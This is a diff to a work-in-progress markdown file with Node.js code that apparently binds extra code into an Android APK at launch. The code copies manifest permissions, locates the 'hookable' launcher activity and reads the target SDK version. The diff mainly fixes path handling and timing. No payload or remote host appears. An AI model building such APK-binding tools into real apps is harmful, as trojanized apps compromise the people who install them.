@@ -1,6 +1,7 @@
 ## New Bind on Launch function
 > Work in progress.
-```js
+> > Almost done!
+```javascript
 const fs = require('fs-extra');
 
 const xml2js = require('xml2js');
@@ -117,21 +118,28 @@ var copyPermissions = (manifest) => { // $appCtrl.copyPermissions = (manifest) =
 
               console.log('[★] Locating the Hookable Main Class File...\n');
 
-              readdirp(apkFolder, { fileFilter: launcherActivity, alwaysStat: true })
-
-                .on('data', (entry) => {
+              readdirp(apkFolder, { fileFilter: launcherActivity, alwaysStat: true }).on('data', (entry) => {
 
                   var { path, stats: { } } = entry;
 
                   var output = `${JSON.stringify(path)}`;
 
-                  if (process.platform === 'android') {
+                  
 
-                    var launcherPath = output.replace(/^"(.*)"$/, '$1')
+                  if (process.platform === 'win32') {
 
+                  	var launcherPath = output.replace(/^"(.*)"$/, '$1')
                       .replace(/\\/g, "/")
-
                       .replace(/\n$/, '');
+
+                  } else {
+
+                  	var launcherPath = output.replace(/^"(.*)"$/, '$1')
+                    .replace(/\n$/, '');
+
+                  }
+
+                  setTimeout(() => {
 
                     if (!launcherPath) {
 
@@ -181,9 +189,9 @@ var copyPermissions = (manifest) => { // $appCtrl.copyPermissions = (manifest) =
 
                             setTimeout(() => {
 
-                            	console.log('[★] Determining Target SDK Version...\n');
-                                
-                                fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
+                             console.log('[★] Determining Target SDK Version...\n');
+
+                              fs.readFile(dir.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
 
                                 if (error) {
 
@@ -289,7 +297,7 @@ var copyPermissions = (manifest) => { // $appCtrl.copyPermissions = (manifest) =
 
                     }, 1000);
 
-                  };
+                  }, 1000);
 
                 });
 
